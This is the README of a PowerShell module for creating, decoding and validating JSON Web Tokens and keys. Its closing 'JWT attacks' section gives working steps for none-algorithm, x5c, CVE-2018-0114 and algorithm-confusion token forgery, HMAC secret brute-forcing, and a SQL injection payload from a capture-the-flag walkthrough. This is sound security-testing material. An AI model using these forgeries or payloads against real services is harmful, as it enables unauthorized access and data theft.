# ReadMe

## PSJsonWebToken

This PowerShell module contains functions to create, validate, and test JSON Web Tokens (JWT) per [RFC 7519](https://tools.ietf.org/html/rfc7519) and [RFC 7515](https://tools.ietf.org/html/rfc7515). Additional functionality is included for the creation of JSON Web Keys (JWK) per [RFC 7517](https://tools.ietf.org/html/rfc7517).

### Tested on
:desktop_computer: `Windows 10/11`
:penguin: `Linux`
:apple: `MacOS`

### Requirements
Requires PowerShell 5.1 or above.

### Installation

```powershell
Install-Module -Name PSJsonWebToken -Repository PSGallery -Scope CurrentUser
```

## Examples

### Token decoding, creation, and validation

```powershell
# Decode (not validate) a JWT
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYwNTkyMzEsIm5iZiI6MTYwNjA1OTIzMSwiZXhwIjoxNjA2MDU5NTMxLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.7j3SPowPaHlviVZeRFxIwyLa1qPzrL5jk1sguNG0yDg"
$jwt | ConvertFrom-EncodedJsonWebToken


# Create an HMAC-SHA256 signed JWT with a five minute lifetime
$secretKey = "secret" | ConvertTo-SecureString -AsPlainText -Force
$jwt = New-JsonWebToken -Claims @{sub="username@company.com"} -HashAlgorithm SHA256 -SecureKey $secretKey -TimeToLive 300


# Validate an HMAC-SHA256 signed JWT
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYwNTkyMzEsIm5iZiI6MTYwNjA1OTIzMSwiZXhwIjoxNjA2MDU5NTMxLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.7j3SPowPaHlviVZeRFxIwyLa1qPzrL5jk1sguNG0yDg"
$secretKey = "secret" | ConvertTo-SecureString -AsPlainText -Force
Test-JsonWebToken -JsonWebToken $jwt -HashAlgorithm SHA256 -SecureKey $secretKey


# Validate an HMAC-SHA256 signed JWT signature only (skip expiration check)
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYwNTkyMzEsIm5iZiI6MTYwNjA1OTIzMSwiZXhwIjoxNjA2MDU5NTMxLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.7j3SPowPaHlviVZeRFxIwyLa1qPzrL5jk1sguNG0yDg"
$secretKey = "secret" | ConvertTo-SecureString -AsPlainText -Force
Test-JsonWebToken -JsonWebToken $jwt -HashAlgorithm SHA256 -SecureKey $secretKey -SkipExpirationCheck


# Create an RSA-SHA256 signed JWT with a five minute lifetime
$cert = Get-PfxCertificate -FilePath "~/certs/cert.pfx"
$jwt = New-JsonWebToken -Claims @{sub="username@company.com"} -HashAlgorithm SHA256 -Certificate $cert -TimeToLive 300


# Validate an RSA-SHA256 signed JWT (signature and expiration check)
$cert = Get-PfxCertificate -FilePath "~/certs/cert.cer" # (Get-PfxCertificate is capable of also getting certs sans private key)
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyIsImtpZCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyJ9.eyJpYXQiOjE2MDYwNTk2MjMsIm5iZiI6MTYwNjA1OTYyMywiZXhwIjoxNjA2MDU5OTIzLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.R6nTqCRwj_FchHp4oblZTkEIhSiSpGCV255SdXmWibNKS4eXtPlCngYaqfIqCwbeCbQB9G2zKHm2gAAolmylaZVoxaGTLOrrJXhfX79b4MNCT2Ixa1h2-B0RbBwV0lBCuaZscays-mxbR0INdnCPnuefrh1VyU9MC6dBpi-Q8r_En6Rtk1wl_a-xX93WtC2no96AtEV5kNErRUHOmTfhe2IjZR6S5uaMgXxrp7Ays8kEYVGwdWhF-JJ_9yUw9PB5pCmgkBED6urNNoeSTeEjTiqsRoHa1Ra9DhOriaegWXOZHEdthpg_JIzDBPYWjBbIfhNvhCwBrhGHbeXUtJL4bg"
Test-JsonWebToken -JsonWebToken $jwt -HashAlgorithm SHA256 -Certificate $cert


# Verify a JSON Web Token's digital signature only (no expiration) against a JSON Web Key
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyIsImtpZCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyJ9.eyJpYXQiOjE2MTgyNTAzODksIm5iZiI6MTYxODI1MDM4OSwiZXhwIjoxNjE4MjU1MTg5LCJzdWIiOiJ0b255In0.X-RZm-3Hto5U-8Q-Wp1ggqWTFPkO5-Cz9lzoKsH5-1RR9GOrGPuWn-bjIv1YJ46h5Bw-KpiX-dOS47TAq2A0BWdAwczLVA6pzha1WswkT_u3cO1_KSoOjD9qFLjCgk-ns7A48iXpNcOoPBFXgfx8G0rRK68sSnokJ7N2NH-YNUOjg3U7DNJ_-iz8WZ5dNlOvpDsTy0BHMX-lho18sUmakUNpadJr-oD7BXIp--Z57UERBFibppaoxseYRo3VfmhgHibTxP-39mcxU6sH9a99fEEt80hj4w6rZobRxZV-pFPS22B8TBAfVf8L9faMLaXmgV7xtQohqQZgL6oKdJzFPQ"
$jwk = '
{
  "kty": "RSA",
  "use": "sig",
  "e": "AQAB",
  "n": "0yvTvlqT5yrk6lDzmK5_i6e-NKW4Bw8J9U62rcWI4IAr-vKaNqitmSwVLr2jJu29xQ__W22iGu584A82AS5N5YrwA6Rek-7WuHinwupFtCN-cCTzJlAcXUxyU7H0LfFxsXS1LUxSl7F_liIKH81QFE5RvI97R9bmbCn_BXpK4pHnTBGJigA8gJQ0U__YFk7AOSFUBeursQfCVPID99FpQ6pyj-h9WgdOneAfWde4SM1Pnovw59T2UT-JO-ObA5WOtvl0xW21djhhBRusVGWJuncNElhhRpUqNSOcsNQVe026zw8dX1wiMs9migQmz_LokH1bHENIuybdK9xBhXRRbw",
  "kid": "2yCvZnk7k8W66wR2LXR9WCswhAc"
}
'
Test-JsonWebToken -JsonWebToken $jwt -HashAlgorithm SHA256 -JsonWebKey $jwk -SkipExpirationCheck

# Validate an HMAC-SHA256 signed JWT signature as well as audience and issuer claims (no expiration check) displaying verbose output
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzIyNjk0MDcsIm5iZiI6MTY3MjI2OTQwNywiZXhwIjoxNjcyMjY5NzA3LCJpc3MiOiJteWlkcCIsInN1YiI6InRvbnkiLCJhdWQiOiJteWFwcCJ9.6pgmpyVCo9mzCgL07lhAHg5EUbAqYqS6YcxunrlfEYQ"
Test-JsonWebToken -JsonWebToken $jwt -Key "secret" -Audience "myapp" -Issuer "myidp" -SkipExpirationCheck -Verbose

# Attempts to validate a JSON Web Token signature against a collection of JSON Web Keys in https://app.mycompany.com/common/discovery/keys
# and provides verbose output detailing what JWK was used to verify the signature
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyIsImtpZCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyJ9.eyJpYXQiOjE2MTgyNTAzODksIm5iZiI6MTYxODI1MDM4OSwiZXhwIjoxNjE4MjU1MTg5LCJzdWIiOiJ0b255In0.X-RZm-3Hto5U-8Q-Wp1ggqWTFPkO5-Cz9lzoKsH5-1RR9GOrGPuWn-bjIv1YJ46h5Bw-KpiX-dOS47TAq2A0BWdAwczLVA6pzha1WswkT_u3cO1_KSoOjD9qFLjCgk-ns7A48iXpNcOoPBFXgfx8G0rRK68sSnokJ7N2NH-YNUOjg3U7DNJ_-iz8WZ5dNlOvpDsTy0BHMX-lho18sUmakUNpadJr-oD7BXIp--Z57UERBFibppaoxseYRo3VfmhgHibTxP-39mcxU6sH9a99fEEt80hj4w6rZobRxZV-pFPS22B8TBAfVf8L9faMLaXmgV7xtQohqQZgL6oKdJzFPQ"
$jwkUri = "https://app.mycompany.com/common/discovery/keys"
Test-JsonWebToken -JsonWebToken $jwt -Uri $jwkUri -SkipExpirationCheck -Verbose

# Display a decoded JWT
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYwNTkyMzEsIm5iZiI6MTYwNjA1OTIzMSwiZXhwIjoxNjA2MDU5NTMxLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.7j3SPowPaHlviVZeRFxIwyLa1qPzrL5jk1sguNG0yDg"
$jwt | Show-DecodedJwt
```

### Generate a JWK (JSON Web Key) set from a certificate
```powershell
# Return as formatted JSON
$cert = Get-PfxCertificate -FilePath "~/certs/cert.cer"
New-JsonWebKeySet -Certificate $cert -KeyOperations Verification


# Compress the resulting JSON
$cert = Get-PfxCertificate -FilePath "~/certs/cert.cer"
New-JsonWebKeySet -Certificate $cert -KeyOperations Verification -Compress

# Create a public/private key pair, and serialize the public key (from Linux or MacOS with openssl and PowerShell 7 installed):
openssl req -newkey rsa:2048 -new -nodes -x509 -days 3650 -keyout pvk.pem -out pub.pem
openssl pkcs12 -inkey pvk.pem -in pub.pem -export -out cert.pfx
$cert = Get-PfxCertificate -FilePath ./cert.pfx
$cert | njwks -c > jwk.json
```

### Create a JWT using a self-signed cert and verify signature against JWK
```powershell
# Generate self-signed signing certificate required for New-JsonWebToken:
function New-JwtSigningCert([string]$Upn = "jwt.test@mydomain.local",
    [string]$Subject = "CN=jwt.test.mydomain.local",
    [string]$KeyUsage = "DigitalSignature",
    [string]$StoreLocation = "Cert:\CurrentUser\My") {

    [System.Security.Cryptography.X509Certificates.X509Certificate2]$cert = $null

    $parameters = @{
        Type              = "Custom";
        Subject           = $Subject;
        TextExtension     = @("2.5.29.37={text}1.3.6.1.5.5.7.3.2", "2.5.29.17={text}upn=$Upn");
        KeyUsage          = $KeyUsage;
        KeyAlgorithm      = "RSA";
        KeyLength         = 2048;
        CertStoreLocation = $StoreLocation;
        Provider          = 'Microsoft Enhanced RSA and AES Cryptographic Provider';
        KeySpec           = "KeyExchange"
        KeyExportPolicy   = "Exportable"
    }

    $generatedCert = New-SelfSignedCertificate @parameters

    # If PowerShell 7.*, have to get the newly created cert from the store location as opposed to just returning it:
    $certPath = Join-Path -Path $StoreLocation -ChildPath $generatedCert.Thumbprint
    $cert = Get-Item -Path $certPath

    return $cert
}

# Generate JWT:
$jwtSigningCert = New-JwtSigningCert
$claims = @{sub = "test.user@mydomain.local"; roles = ("tester", "admin") }
$jwt = New-JsonWebToken -Claims $claims -SigningCertificate $jwtSigningCert -TimeToLive 300

# Generate JWK (not JWK set, just JWK):
$jwk = New-JsonWebKey -Certificate $jwtSigningCert -AsJson

# Validate JWT against the JWK:
Test-JsonWebToken -JsonWebToken $jwt -JsonWebKey $jwk -Verbose

# (Optional) serialize x509 cert as JWK set and output to a file for further validation:
$jwtSigningCert | New-JsonWebKeySet -Compress | Out-File -FilePath .\jwks.json -Encoding ascii

# Cleanup (remove cert):
Remove-Item -Path $jwtSigningCert.PSPath
```

### JWT attacks
```powershell
# None alg attack
$jwt = New-JsonWebToken -Claims @{sub="hackerman@hacktheplanet.org";role="megahacker"} -TimeToLive 3600

# x5c claim misuse
$jwt = New-JsonWebToken -Claims @{sub = "hackerman@hacktheplanet.org"; role = "megahacker" } -SigningCertificate $cert -TimeToLive 3600 -IncludeX509CertChain


# CVE-2018-0114 vulnerability
# 1. Acquire existing JWT that is used by API endpoint:
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyIsImtpZCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyJ9.eyJpYXQiOjE2MDYwNTk2MjMsIm5iZiI6MTYwNjA1OTYyMywiZXhwIjoxNjA2MDU5OTIzLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.R6nTqCRwj_FchHp4oblZTkEIhSiSpGCV255SdXmWibNKS4eXtPlCngYaqfIqCwbeCbQB9G2zKHm2gAAolmylaZVoxaGTLOrrJXhfX79b4MNCT2Ixa1h2-B0RbBwV0lBCuaZscays-mxbR0INdnCPnuefrh1VyU9MC6dBpi-Q8r_En6Rtk1wl_a-xX93WtC2no96AtEV5kNErRUHOmTfhe2IjZR6S5uaMgXxrp7Ays8kEYVGwdWhF-JJ_9yUw9PB5pCmgkBED6urNNoeSTeEjTiqsRoHa1Ra9DhOriaegWXOZHEdthpg_JIzDBPYWjBbIfhNvhCwBrhGHbeXUtJL4bg"

# 2. Get cert used to sign token via RSA-SHA256:
$cert = Get-PfxCertificate -FilePath "~/certs/cert.pfx"

# 3. Obtain existing payload:
$jwtPayload = Get-JsonWebTokenPayload -JsonWebToken $jwt

# 4. Generate new JWT signed with attackers private key with the public key embedded in the 'jwk' attribute in the header:
$jwt = New-JsonWebToken -Claims $jwtPayload -SigningCertificate $cert -TimeToLive 3600 -IncludeJwk


#  Brute force an HMAC-SHA256 JWT in an attempt to obtain the secret used to sign it
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYxNDEwOTMsIm5iZiI6MTYwNjE0MTA5MywiZXhwIjoxNjA2MTQxMzkzLCJqdGkiOiI1Njk5YTBlYTk3YzM0Yzc2OTlkZGZlNzNmNTIzOTI1MiIsInN1YiI6InVzZXJuYW1lQGNvbXBhbnkuY29tIn0.Ej86QALzH37R1zB7QhwwYdFjXL1UhG2E3n6nezEYONY"
$jwt | Test-JwtSecret -WordListFilePath "./rockyou.txt"


# Same brute force as above but using the aliased version of Test-JwtSecret
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYxNDEwOTMsIm5iZiI6MTYwNjE0MTA5MywiZXhwIjoxNjA2MTQxMzkzLCJqdGkiOiI1Njk5YTBlYTk3YzM0Yzc2OTlkZGZlNzNmNTIzOTI1MiIsInN1YiI6InVzZXJuYW1lQGNvbXBhbnkuY29tIn0.Ej86QALzH37R1zB7QhwwYdFjXL1UhG2E3n6nezEYONY"
tjwts -t $jwt -f "./rockyou.txt" -v


# Hack The Box "Under Construction" walkthrough (algorithm substitution and SQL injection)
# 1. JWT after registration and authentication:
$jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRvbnkiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MDgyMzkzMTd9.siXge7yRMiG7jE-lUef_mRCQ0ZY3YGPd-0psdjXoHU3CYSl3YkhpWiw724Ns9J_HVkGzsJBd0ZPRKpPdGL0MIaz2iS9IAqNnfdeM36cZpS5MHQT-zI3K2xfZQD2vjU4uyVmxSrSr1YOxFez1Mt6j-lkEiApX4uDwenysYvtNZ5rSiKipyhh03-tSZQJp3zR8YK6ileGy9KTRfGrjRz7_7CfGikGufJuGDaSBNCGKcMvPRJcotM6hWT5hXBW7JTXN62GZqabrXeSkz1DgMxntR5-iOmntLsdJyLhSKNi9jLx-fI3ticBc--70trVYSbV7kowBNtpHWrdvtefh5pgO1A"

# 2. Payload as a hashtable:
$payload = $jwt | Get-JsonWebTokenPayload

# 3. Decoded JWT and this is where we see the "pk" claim with the public key:
$jwt | DecodeJwt | Format-List

# 4. Get the public key:
$key = $payload.pk

# 5. Copy of the payload we're going to alter:
$newPayload = $payload

# 6. SQL injection which is the user name value followed by the query:
$query = "tony' AND 1=0 UNION SELECT 1,(SELECT top_secret_flaag FROM flag_storage),3;--"

# 7. Change the user name from "tony" to the above SQL query:
$newPayload.username = $query

# 8. Generate new JWT with the altered payload above and exclude default claims (iat, nbf, and exp) signed with the discovered key:
$newJwt = New-JsonWebToken -Claims $newPayload -HashAlgorithm SHA256 -ExcludeDefaultClaims -Key $key


# Algorithm confusion attack:
# 1. Pre-captured JWT
$captureJwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Img4czl6OFBXd2x6OTJPTV9sY0gyWk5ZdTlqMCIsImtpZCI6Img4czl6OFBXd2x6OTJPTV9sY0gyWk5ZdTlqMCJ9.eyJpYXQiOjE2ODE0MTg3MzEsIm5iZiI6MTY4MTQxODczMSwiZXhwIjoxNjgxNDE5MzMxLCJhbXIiOlsicHdkIl0sInZlciI6IjEuMCIsImlkcCI6InRvbnktaWRwLmNvbSIsImZhbWlseV9uYW1lIjoiR3VpbWVsbGkiLCJhcHBpZCI6ImMyMTdhOTBiLTI0YTAtNDRlMC1hZDAyLTA0NTliNWM1ODllNSIsImp0aSI6ImQzZmFkODk3LTFmMGMtNDI2Ni1hYmExLTdjMDVlN2RkMzY4ZiIsImdpdmVuX25hbWUiOiJBbnRob255IiwiaXBhZGRyIjoiMzQuMjguMTg2LjIxIiwic3ViIjoiZng0NmN5YVFCblpKQmtkQktCNHlpQU1fUGo2S3NsaTRBMGdRQzREcXZyVSIsImVtYWlsIjoidG9ueS5ndWltZWxsaUBnbWFpbC5jb20iLCJvaWQiOiIzNWQ5NWMyYy0wNzY5LTQ4ZGYtYTg2NS1mNGMxOTdhNzcwODkiLCJ1bmlxdWVfbmFtZSI6InRvbnktaWRwLmNvbSN0b255Lmd1aW1lbGxpQHNvbWVkb21haW4uY29tIiwiZ3JvdXBzIjpbIjc0NmM4ZDc5LWQ5OTUtNDNjNy1iNGM0LTU3MWQwYjQzZWI5MyJdLCJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJwdWlkIjoiMTAwMzIwMDEwRTQ2MUQwOSIsInhtc190Y2R0IjoxNjExMDg4MTU0LCJ1dGkiOiJQNExrR296OHowQ3UydVZRdXE1cEFRIiwic2NwIjoidXNlcl9pbXBlcnNvbmF0aW9uIiwiaXNzIjoiaHR0cHM6Ly9zdHMudG9ueS1pZHAuY29tLzc0MDQxYzVlLTZjMDItNGFiOS05MWM0LTg2NTBlZDg0ODU2YiIsImFjciI6IjEiLCJuYW1lIjoiVG9ueSBHdWltZWxsaSIsInRpZCI6ImEwN2U0NTFiLTFkNTQtNDZkZS1hYzJmLWYwNWYyNzY4NzhlOSIsImFwcGlkYWNyIjoiMiJ9.S_apqTxvse4gqxu02HEa9vj7oeey36jpgP17UMdd93Yr-oNS82HDYk-hvuGdxYklrSg7SbS64ZVHGeUsTIPDsV4xWS7hlxAWoim3-2deq2Ns-rg66ekUowRARY8REAE3QGOwaF8fQxLBJvoV4zThaOOkOjdsEiaNC8PfzKiu-56lNv3la1lOKdjO0Q3Tm1O0niVOP22gyZjV69O30nQMGWGHr_0p3w87py_97ccPqVP1rz4ZU-pK54O44eCyaupd-58QkdxvCc1N5b2tNE-OhpHBZapoUmje3aVwyefzhW0IqiwaL8QGQzt8A9yKIJX9zo-Us_dcfEB_PAeZbA_XoA"

# 2. Target JWK endpoint to obtain HMAC signing key from with target JWK ID:
$jwkUri = "https://app.mycompany.com/common/discovery/jwks"
$targetKid = "h8s9z8PWwlz92OM_lcH2ZNYu9j0"

# 3. Generate signing key from JWK converted to PEM:
$signingKey = Convert-JwkToPem -Uri $jwkSetUri | Where-Object JwkIdentifier -eq $targetKid | Select-Object -ExpandProperty Pem

# 4. Obtain prior payload to feed into new JWT:
$jwtPayload = $captureJwt | Get-JsonWebTokenPayload

# 5. Craft new JWT with same payload, new date ranges, and signed with public key as HMAC key:
$badJwt = New-JsonWebToken -Claims $jwtPayload -Key $signingKey -TimeToLive 6000
```
